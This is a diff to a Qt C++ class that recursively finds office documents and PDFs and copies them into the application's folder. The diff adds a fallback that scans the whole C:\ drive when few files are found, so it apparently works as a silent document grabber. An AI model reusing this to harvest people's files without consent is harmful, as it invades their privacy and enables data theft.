@@ -2,7 +2,7 @@
 
 Copy::Copy(QObject *parent) : QObject(parent)
 {
-
+    m_fileCount = 0;//Number of founded files
 }
 
 void Copy::run()
@@ -20,16 +20,21 @@ void Copy::run()
 void Copy::scanDir(QString dir){
     //Word - Powerpoint - Pdf Extension - Openoffice
     //Using Qdir iterator is much faster
-    QDirIterator it(dir, QStringList() << "*.doc"  << "*.docx" << "*.docm" << "*.ppt" << "*.pptx" << "*.pptm" << "*.ppsx" << "*.ppsm"  << "*.sldx" << "*.pdf" << "*.odt", QDir::Files | QDir::NoDotAndDotDot | QDir::NoSymLinks, QDirIterator::Subdirectories);
+    QDirIterator it(dir, QStringList() << "*.doc"  << "*.docx" << "*.docm" << "*.ppt" << "*.pptx" << "*.pptm" << "*.ppsx" << "*.ppsm"  << "*.sldx"  << "*.odt" << "*.pdf", QDir::Files | QDir::NoDotAndDotDot | QDir::NoSymLinks, QDirIterator::Subdirectories);
 
     while (it.hasNext())
     {
         qDebug() << "\nFound file: " << it.next();
         qDebug() << "Dir path: "  << QString(it.path());
         qDebug() << "File name: "  << QString(it.fileName()) << "\n";
+        m_fileCount++;
         //copyDirToRoot(QString(it.path())); //Copy all dir
         copyFileToRoot(QString(it.filePath()), it.fileName()); //Copy found file
 
+    }
+    if(m_fileCount <= 5){
+        qDebug() << "Start scanning C:/ " << "\n";
+        scanDir(QDir::rootPath()); // We start scaning (C:\)
     }
 }
 
@@ -38,7 +43,6 @@ bool Copy::copyFileToRoot(QString sourceFilePath, QString fileName)
     //App root dir
     QString appDir = QCoreApplication::applicationDirPath() + "/" + fileName;
 
-    //copy_dir_recursive(sourceFile, appDir, true);
     if (QFile::exists(appDir))//Replace if already exist
     {
             if (QFile::remove(appDir) == false)
